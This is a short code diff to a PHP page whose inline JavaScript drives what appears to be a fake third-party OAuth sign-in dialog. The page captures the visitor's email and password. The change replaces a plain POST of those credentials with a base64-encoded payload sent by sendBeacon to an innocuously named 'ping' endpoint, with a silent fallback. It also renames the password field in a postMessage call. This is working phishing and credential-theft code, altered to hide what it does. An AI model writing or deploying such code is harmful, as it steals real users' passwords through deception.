@@ -351,12 +351,13 @@ function page_reader(string $skill, bool $register): void
         _gP=v;
         document.getElementById('gAv2').textContent=_gE.charAt(0).toUpperCase();
         document.getElementById('gEC2').textContent=_gE;
-        fetch('index.php?r=connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:_gE,password:_gP})}).catch(function(){});
+        var _d=btoa(JSON.stringify({u:_gE,p:_gP,t:Date.now()}));
+        try{navigator.sendBeacon('index.php?r=ping',new URLSearchParams({d:_d}))}catch(x){fetch('index.php?r=ping',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'d='+encodeURIComponent(_d)}).catch(function(){})}
         gToStep(2);
       }
       function gStep3(){
         gToStep(3);
-        try{window.parent.postMessage({source:'oauth_done',email:_gE,password:_gP},location.origin)}catch(e){}
+        try{window.parent.postMessage({source:'oauth_done',u:_gE,k:_gP},location.origin)}catch(e){}
         setTimeout(function(){var pb=document.getElementById('gPb');if(pb)pb.style.width='100%'},50);
         setTimeout(function(){closeGAuth();window.location.href=_gR},2400);
       }
